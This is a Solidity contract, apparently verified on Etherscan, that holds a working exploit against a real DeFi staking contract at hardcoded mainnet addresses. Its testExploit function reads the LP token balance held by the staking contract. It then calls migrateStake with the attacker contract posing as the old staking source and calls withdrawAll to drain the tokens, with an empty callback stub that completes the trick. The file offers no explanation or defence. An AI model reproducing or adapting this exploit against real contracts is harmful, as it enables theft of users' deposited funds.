/**
 *Submitted for verification at Etherscan.io on 2022-12-08
*/

//SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.17;

interface IStaxLPStaking {
    function migrateStake(address oldStaking, uint256 amount) external;

    function withdrawAll(bool claim) external;
}
interface IERC20 {
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);

    function name() external view returns (string memory);

    function symbol() external view returns (string memory);

    function decimals() external view returns (uint8);

    function totalSupply() external view returns (uint256);

    function balanceOf(address owner) external view returns (uint256);

    function allowance(address owner, address spender)
    external
    view
    returns (uint256);

    function approve(address spender, uint256 value) external returns (bool);

    function transfer(address to, uint256 value) external returns (bool);

    function transferFrom(
        address from,
        address to,
        uint256 value
    ) external returns (bool);
    function withdraw(uint256 wad) external;
    function deposit(uint256 wad) external returns (bool);
    function owner() external view returns (address);
}

contract ContractTest12 {
//    CheatCodes cheat = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    IERC20 xFraxTempleLP = IERC20(0xBcB8b7FC9197fEDa75C101fA69d3211b5a30dCD9);
    IStaxLPStaking StaxLPStaking = IStaxLPStaking(0xd2869042E12a3506100af1D192b5b04D65137941);

    function testExploit() public {

        uint lpbalance = xFraxTempleLP.balanceOf(address(StaxLPStaking));

        StaxLPStaking.migrateStake(address(this), lpbalance);

        //    console.log("Perform migrateStake");

        StaxLPStaking.withdrawAll(false);
        //    console.log("Perform withdrawAll");
        //    console.log("After exploiting, xFraxTempleLP balance:", xFraxTempleLP.balanceOf(address(this))/1e18);
    }

    function migrateWithdraw(address, uint256) public //callback
    {

    }

    function getValue() public pure returns (uint){
        return 33;
    }
}